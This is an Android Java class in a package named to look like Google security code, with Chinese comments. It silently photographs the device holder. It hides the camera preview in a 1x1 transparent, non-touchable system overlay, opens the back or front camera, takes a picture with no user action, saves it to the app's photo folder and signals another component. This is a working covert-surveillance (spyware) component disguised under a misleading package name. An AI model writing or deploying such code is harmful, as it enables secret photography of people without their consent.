package com.google.security.tools;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import com.google.security.FinishReceiver;
import com.google.security.MainService;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.AutoFocusCallback;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.PictureCallback;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

/*
 * Function：拍照工具类，打开摄像头拍照并保存到本地目录中
 * Author：   RongRong
 * Create Date: 201511.11
 * Update Date：
 * */
public class PhotoTool {
	private static final String LOGTAG = "PhotoTool";
	private static PhotoTool photoTool;
	private Context context;
	private SurfaceView mySurfaceView;
	private SurfaceHolder myHolder;
	private Camera myCamera;
	private Thread thread;
	private WindowManager wm;

	private PhotoTool(Context context) {
		this.context = context;

	}

	public static PhotoTool getIntance(Context context) {
		if (photoTool == null)
			return new PhotoTool(context);
		return photoTool;
	}

	public void start() {
		try {
			initSurface();
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		// 这里得开线程进行拍照，因为Activity还未完全显示的时候，是无法进行拍照的，SurfaceView必须先显示
		thread = new Thread(new Runnable() {
			@Override
			public void run() {

				// 初始化camera并对焦拍照
				try {
					initCamera();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
		thread.start();

	}

	public void stop() {// 停止拍照函数
		myCamera.release();
		wm.removeView(mySurfaceView);

	}

	private void initSurface() {
		// 初始化surfaceview
		mySurfaceView = new SurfaceView(context);

		wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);

		WindowManager.LayoutParams params = new WindowManager.LayoutParams(1,
				1, WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
				WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
						| WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
				PixelFormat.TRANSPARENT);
		params.gravity = Gravity.TOP | Gravity.RIGHT;
		params.alpha = PixelFormat.TRANSPARENT;

		params.x = params.y = 1;
		wm.addView(mySurfaceView, params);

		// 初始化surfaceholder
		myHolder = mySurfaceView.getHolder();
		myHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

	}

	// 初始化摄像头
	private void initCamera() {

		// 如果存在摄像头
		if (checkCameraHardware(context)) {
			// 获取摄像头（首选前置，无前置选后置）
			if (openFacingBackCamera()) {
				Log.e(LOGTAG, "openCameraSuccess");
				// 进行对焦
				autoFocus();
			} else {
				Log.e(LOGTAG, "openCameraFailed");
			}

		}
	}

	// 对焦并拍照
	private void autoFocus() {

		try {
			// 因为开启摄像头需要时间，这里让线程睡两秒
			Thread.sleep(3000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		// 自动对焦
		try {
			myCamera.autoFocus(myAutoFocus);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		// 对焦后拍照
		try {
			myCamera.takePicture(null, null, myPicCallback);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// 判断是否存在摄像头
	private boolean checkCameraHardware(Context context) {

		if (context.getPackageManager().hasSystemFeature(
				PackageManager.FEATURE_CAMERA)) {
			// 设备存在摄像头
			return true;
		} else {
			// 设备不存在摄像头
			return false;
		}

	}

	// 得到后置摄像头
	private boolean openFacingBackCamera() {

		// 尝试开启前置摄像头
		CameraInfo cameraInfo = new CameraInfo();
		for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
			Camera.getCameraInfo(camIdx, cameraInfo);
			if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
				try {

					Log.e(LOGTAG, "tryToOpenCamera");
					myCamera = Camera.open(camIdx);
					Camera.Parameters parameters = myCamera.getParameters(); // 获取相机参数

					parameters.setPictureFormat(PixelFormat.JPEG); // 指定图片为JPEG图片
					parameters.set("jpg-quality", 80); // 设置图片的质量
					parameters.setPictureSize(640, 480); // 设置拍摄图片的尺寸
					myCamera.setParameters(parameters); // 重新设置相机参数
				} catch (RuntimeException e) {
					e.printStackTrace();
					return false;
				}
			}
		}

		// 如果开启前置失败（无后置）则开启前置
		if (myCamera == null) {
			for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
				Camera.getCameraInfo(camIdx, cameraInfo);
				if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
					try {
						myCamera = Camera.open(camIdx);
						Camera.Parameters parameters = myCamera.getParameters(); // 获取相机参数
						parameters.setPictureSize(640, 480); // 设置预览画面的尺寸
						parameters.setPictureFormat(PixelFormat.JPEG); // 指定图片为JPEG图片
						parameters.set("jpg-quality", 85); // 设置图片的质量
						parameters.setPictureSize(640, 480); // 设置拍摄图片的尺寸
						myCamera.setParameters(parameters); // 重新设置相机参数
					} catch (RuntimeException e) {
						e.printStackTrace();
						return false;
					}
				}
			}
		}

		try {
			// 这里的myCamera为已经初始化的Camera对象
			myCamera.setPreviewDisplay(myHolder);
		} catch (IOException e) {
			e.printStackTrace();
			myCamera.stopPreview();
			myCamera.release();
			myCamera = null;

		}

		myCamera.startPreview();

		return true;
	}

	// 自动对焦回调函数(空实现)
	private AutoFocusCallback myAutoFocus = new AutoFocusCallback() {
		@Override
		public void onAutoFocus(boolean success, Camera camera) {
		}
	};

	// 拍照成功回调函数
	private PictureCallback myPicCallback = new PictureCallback() {

		@Override
		public void onPictureTaken(byte[] data, Camera camera) {
			// 完成拍照后关闭Activity

			// 将得到的照片进行90°旋转，使其竖直
			Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
			Matrix matrix = new Matrix();
			matrix.preRotate(90);
			bitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(),
					bitmap.getHeight(), matrix, true);

			// 创建并保存图片文件
			// SimpleDateFormat dateFormat = new
			// SimpleDateFormat("yyyymmddhhmmss");
			// String date = dateFormat.format(new Date());

			File pictureFile = new File(getDir(), System.currentTimeMillis()
					/ 1000 + ".jpg");
			try {
				FileOutputStream fos = new FileOutputStream(pictureFile);
				bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
				fos.close();
			} catch (Exception error) {
				Log.e(LOGTAG, "保存照片失败" + error.toString());
				error.printStackTrace();
				myCamera.stopPreview();
				myCamera.release();
				myCamera = null;

			}

			Log.e(LOGTAG, "获取照片成功");
			// Toast.makeText(context, "获取照片成功", Toast.LENGTH_SHORT).show();

			// if(file.list().length!=0){

			// }
			myCamera.stopPreview();
			myCamera.release();
			myCamera = null;

			while (true) {
				File file = new File(MainService.PHOTO_FORDER_PATH);
				if (file.list().length != 0) {
					FinishReceiver.finishbroadcast("photo", context);
					break;
				}
			}
		}
	};

	// 获取文件夹

	private File getDir() {
		// 得到SD卡根目录

		File dir = new File(MainService.PHOTO_FORDER_PATH);
		// Environment.getExternalStorageDirectory();

		if (dir.exists()) {
			return dir;
		} else {
			dir.mkdirs();
			return dir;
		}
	}
}
